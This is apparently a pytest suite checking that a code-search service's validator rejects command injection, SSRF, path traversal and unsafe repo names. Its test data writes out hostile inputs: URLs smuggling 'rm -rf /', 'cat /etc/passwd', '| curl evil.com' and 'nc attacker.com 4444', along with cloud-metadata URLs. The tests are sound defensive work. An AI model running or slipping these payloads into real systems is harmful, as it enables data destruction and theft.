"""
Test Suite for Input Validation
Comprehensive tests for security-critical validation functions
"""
import pytest
import os
from services.input_validator import InputValidator, CostController


class TestGitUrlValidation:
    """Test Git URL validation - security critical"""
    
    def test_valid_github_urls(self):
        """Test valid GitHub URLs are accepted"""
        valid_urls = [
            "https://github.com/pmndrs/zustand",
            "https://github.com/user/repo.git",
            "https://github.com/facebook/react",
            "https://github.com/user-name/repo-name.git",
            "https://github.com/user.name/repo.name",
            "http://github.com/user/repo",  # HTTP allowed (not recommended)
        ]
        
        for url in valid_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert is_valid, f"Should accept valid GitHub URL: {url}, got error: {error}"
    
    def test_valid_gitlab_urls(self):
        """Test valid GitLab URLs are accepted"""
        valid_urls = [
            "https://gitlab.com/user/repo",
            "https://gitlab.com/group/subgroup/repo.git",
        ]
        
        for url in valid_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert is_valid, f"Should accept valid GitLab URL: {url}, got error: {error}"
    
    def test_valid_bitbucket_urls(self):
        """Test valid Bitbucket URLs are accepted"""
        valid_urls = [
            "https://bitbucket.org/user/repo",
            "https://bitbucket.org/team/project.git",
        ]
        
        for url in valid_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert is_valid, f"Should accept valid Bitbucket URL: {url}, got error: {error}"
    
    def test_valid_ssh_urls(self):
        """Test valid SSH URLs are accepted"""
        valid_urls = [
            "git@github.com:user/repo.git",
            "git@gitlab.com:user/repo.git",
            "git@bitbucket.org:user/repo.git",
        ]
        
        for url in valid_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert is_valid, f"Should accept valid SSH URL: {url}, got error: {error}"


class TestCommandInjectionPrevention:
    """Test command injection attack prevention - CRITICAL SECURITY"""
    
    def test_semicolon_injection(self):
        """Block semicolon command chaining"""
        malicious_urls = [
            "https://github.com/user/repo.git; rm -rf /",
            "https://github.com/user/repo;cat /etc/passwd",
            "https://github.com/user/repo.git;whoami",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject semicolon injection: {url}"
            assert "forbidden character" in error.lower() or "invalid" in error.lower()
    
    def test_and_operator_injection(self):
        """Block && command chaining"""
        malicious_urls = [
            "https://github.com/user/repo.git && rm -rf /",
            "https://github.com/user/repo&&cat /etc/passwd",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject && injection: {url}"
    
    def test_or_operator_injection(self):
        """Block || command chaining"""
        malicious_urls = [
            "https://github.com/user/repo.git || cat /etc/passwd",
            "https://github.com/user/repo||whoami",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject || injection: {url}"
    
    def test_pipe_injection(self):
        """Block pipe command injection"""
        malicious_urls = [
            "https://github.com/user/repo.git | curl evil.com",
            "https://github.com/user/repo|nc attacker.com 4444",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject pipe injection: {url}"
    
    def test_backtick_injection(self):
        """Block backtick command substitution"""
        malicious_urls = [
            "https://github.com/user/`whoami`.git",
            "https://github.com/`id`/repo.git",
            "https://github.com/user/repo`rm -rf /`.git",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject backtick injection: {url}"
    
    def test_subshell_injection(self):
        """Block $() subshell command substitution"""
        malicious_urls = [
            "https://github.com/user/$(whoami).git",
            "https://github.com/$(cat /etc/passwd)/repo.git",
            "https://github.com/user/repo$(id).git",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject subshell injection: {url}"
    
    def test_variable_expansion_injection(self):
        """Block ${} variable expansion"""
        malicious_urls = [
            "https://github.com/user/${HOME}.git",
            "https://github.com/${USER}/repo.git",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject variable expansion: {url}"
    
    def test_newline_injection(self):
        """Block newline injection"""
        malicious_urls = [
            "https://github.com/user/repo.git\nrm -rf /",
            "https://github.com/user/repo.git\r\nwhoami",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject newline injection: {url}"
    
    def test_null_byte_injection(self):
        """Block null byte injection"""
        malicious_urls = [
            "https://github.com/user/repo.git\x00rm -rf /",
            "https://github.com/user\x00/repo.git",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject null byte injection: {url}"


class TestSSRFPrevention:
    """Test Server-Side Request Forgery prevention"""
    
    def test_localhost_blocked(self):
        """Block localhost URLs"""
        malicious_urls = [
            "http://localhost/repo",
            "https://localhost:8080/user/repo",
            "http://localhost.localdomain/repo",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject localhost: {url}"
    
    def test_loopback_ip_blocked(self):
        """Block 127.x.x.x loopback addresses"""
        malicious_urls = [
            "http://127.0.0.1/repo",
            "https://127.0.0.1:8080/user/repo",
            "http://127.1.1.1/repo",  # Also loopback
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject loopback IP: {url}"
    
    def test_private_ip_class_a_blocked(self):
        """Block 10.x.x.x private range"""
        malicious_urls = [
            "http://10.0.0.1/internal/repo",
            "https://10.255.255.255/secret/repo",
            "http://10.0.0.1:3000/repo",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject Class A private IP: {url}"
    
    def test_private_ip_class_b_blocked(self):
        """Block 172.16-31.x.x private range"""
        malicious_urls = [
            "http://172.16.0.1/repo",
            "https://172.31.255.255/repo",
            "http://172.20.0.1/internal/repo",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject Class B private IP: {url}"
    
    def test_private_ip_class_c_blocked(self):
        """Block 192.168.x.x private range"""
        malicious_urls = [
            "http://192.168.1.1/repo",
            "https://192.168.0.1/repo",
            "http://192.168.255.255/repo",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject Class C private IP: {url}"
    
    def test_link_local_blocked(self):
        """Block 169.254.x.x link-local (AWS metadata!)"""
        malicious_urls = [
            "http://169.254.169.254/latest/meta-data",  # AWS metadata
            "http://169.254.169.254/latest/user-data",
            "http://169.254.1.1/repo",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject link-local IP (AWS metadata): {url}"
    
    def test_cloud_metadata_hosts_blocked(self):
        """Block cloud metadata service hostnames"""
        # These might not resolve, but should be blocked by allowlist anyway
        malicious_urls = [
            "http://metadata.google.internal/computeMetadata/v1/",
        ]
        
        for url in malicious_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"SECURITY: Must reject metadata service: {url}"


class TestHostAllowlist:
    """Test that only allowed hosts are permitted"""
    
    def test_unknown_hosts_blocked(self):
        """Block hosts not in allowlist"""
        blocked_urls = [
            "https://evil-git-server.com/user/repo",
            "https://github.com.evil.com/user/repo",  # Subdomain trick
            "https://notgithub.com/user/repo",
            "https://randomserver.io/user/repo",
            "https://internal-git.company.com/repo",  # Corporate self-hosted
        ]
        
        for url in blocked_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"Should reject unknown host: {url}"
            assert "not in allowed list" in error.lower()
    
    def test_invalid_schemes_blocked(self):
        """Block dangerous URL schemes"""
        blocked_urls = [
            "file:///etc/passwd",
            "ftp://github.com/user/repo",
            "data:text/plain,malicious",
            "javascript:alert(1)",
            "gopher://evil.com/",
        ]
        
        for url in blocked_urls:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"Should reject scheme: {url}"
    
    def test_custom_allowed_hosts_via_env(self, monkeypatch):
        """Test custom allowed hosts via environment variable"""
        # Set custom allowed hosts
        monkeypatch.setenv('ALLOWED_GIT_HOSTS', 'git.mycompany.com,internal-git.corp.com')
        
        # Clear cached hosts (if any caching is implemented)
        # Custom host should now be allowed
        is_valid, _ = InputValidator.validate_git_url("https://git.mycompany.com/team/repo")
        assert is_valid, "Should accept custom allowed host"
        
        # Default hosts should now be blocked
        is_valid, _ = InputValidator.validate_git_url("https://github.com/user/repo")
        assert not is_valid, "Should reject github when custom hosts set"


class TestUrlFormatValidation:
    """Test URL format validation"""
    
    def test_empty_url_rejected(self):
        """Reject empty URLs"""
        is_valid, error = InputValidator.validate_git_url("")
        assert not is_valid
        assert "empty" in error.lower()
    
    def test_too_long_url_rejected(self):
        """Reject URLs exceeding length limit"""
        long_url = "https://github.com/user/" + "a" * 500
        is_valid, error = InputValidator.validate_git_url(long_url)
        assert not is_valid
        assert "too long" in error.lower()
    
    def test_missing_path_rejected(self):
        """Reject URLs without owner/repo path"""
        is_valid, error = InputValidator.validate_git_url("https://github.com/")
        assert not is_valid
    
    def test_invalid_ssh_format_rejected(self):
        """Reject malformed SSH URLs"""
        invalid_ssh = [
            "git@github.com",  # Missing repo
            "git@github.com:",  # Missing path
            "git@:user/repo.git",  # Missing host
        ]
        
        for url in invalid_ssh:
            is_valid, error = InputValidator.validate_git_url(url)
            assert not is_valid, f"Should reject invalid SSH URL: {url}"


class TestPathValidation:
    """Test file path validation"""
    
    def test_path_traversal_prevention(self):
        """Test path traversal attacks are blocked"""
        malicious_paths = [
            "../../etc/passwd",
            "../../../secret.key",
            "~/private/file.txt",
            "/etc/passwd",
            "C:\\Windows\\System32",
        ]
        
        for path in malicious_paths:
            is_valid, error = InputValidator.validate_file_path(path)
            assert not is_valid, f"Should reject malicious path: {path}"
            assert error is not None
    
    def test_valid_file_paths(self):
        """Test valid file paths"""
        valid_paths = [
            "src/auth/middleware.py",
            "components/Button.tsx",
            "utils/helpers.js",
        ]
        
        for path in valid_paths:
            is_valid, error = InputValidator.validate_file_path(path)
            assert is_valid, f"Should accept valid path: {path}, got error: {error}"


class TestSearchQueryValidation:
    """Test search query validation"""
    
    def test_valid_queries(self):
        """Test valid queries are accepted"""
        assert InputValidator.validate_search_query("authentication logic")[0]
        assert InputValidator.validate_search_query("error handling in user service")[0]
    
    def test_invalid_queries(self):
        """Test invalid queries are rejected"""
        assert not InputValidator.validate_search_query("")[0]  # Empty
        assert not InputValidator.validate_search_query("a" * 600)[0]  # Too long
        assert not InputValidator.validate_search_query("DROP TABLE users--")[0]  # SQL injection


class TestRepoNameValidation:
    """Test repository name validation"""
    
    def test_valid_names(self):
        """Test valid repo names"""
        assert InputValidator.validate_repo_name("my-repo")[0]
        assert InputValidator.validate_repo_name("project_name")[0]
        assert InputValidator.validate_repo_name("repo.v2")[0]
    
    def test_invalid_names(self):
        """Test invalid repo names"""
        assert not InputValidator.validate_repo_name("../../../etc")[0]
        assert not InputValidator.validate_repo_name("repo with spaces")[0]
        assert not InputValidator.validate_repo_name("")[0]


class TestStringSanitization:
    """Test string sanitization"""
    
    def test_null_bytes_removed(self):
        """Test null bytes are removed"""
        assert '\x00' not in InputValidator.sanitize_string("hello\x00world")
    
    def test_control_characters_removed(self):
        """Test control characters are removed"""
        sanitized = InputValidator.sanitize_string("test\x01\x02\x03data")
        assert '\x01' not in sanitized
    
    def test_length_limiting(self):
        """Test length limiting works"""
        long_string = "a" * 1000
        sanitized = InputValidator.sanitize_string(long_string, max_length=100)
        assert len(sanitized) == 100
